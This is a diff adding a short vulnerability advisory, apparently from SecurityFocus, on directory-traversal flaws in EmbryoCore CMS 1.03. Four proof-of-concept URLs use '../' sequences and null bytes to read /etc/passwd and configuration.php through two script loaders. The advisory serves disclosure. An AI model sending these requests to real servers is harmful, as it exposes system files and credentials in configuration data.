@@ -1,0 +1,17 @@
+source: http://www.securityfocus.com/bid/54470/info
+
+EmbryoCore CMS is prone to multiple directory-traversal vulnerabilities because it fails to properly sanitize user-supplied input.
+
+Remote attackers can use specially crafted requests with directory-traversal sequences ('../') to retrieve arbitrary files in the context of the application.
+
+Exploiting these issues may allow an attacker to obtain sensitive information that could aid in further attacks.
+
+EmbryoCore 1.03 is vulnerable; other versions may also be affected. 
+
+http://www.example.com/embryocore1.03/libs/common/loadscript.php?j=./configuration.php%00
+
+http://www.example.com/embryocore1.03/libs/common/loadscript.php?j=../../../../../../etc/passwd%00
+
+http://www.example.com/embryocore1.03/libs/common/loadcss.php?c=../../../../../../etc/passwd%00
+
+http://www.example.com/embryocore1.03/libs/common/loadcss.php?c=./configuration.php%00 
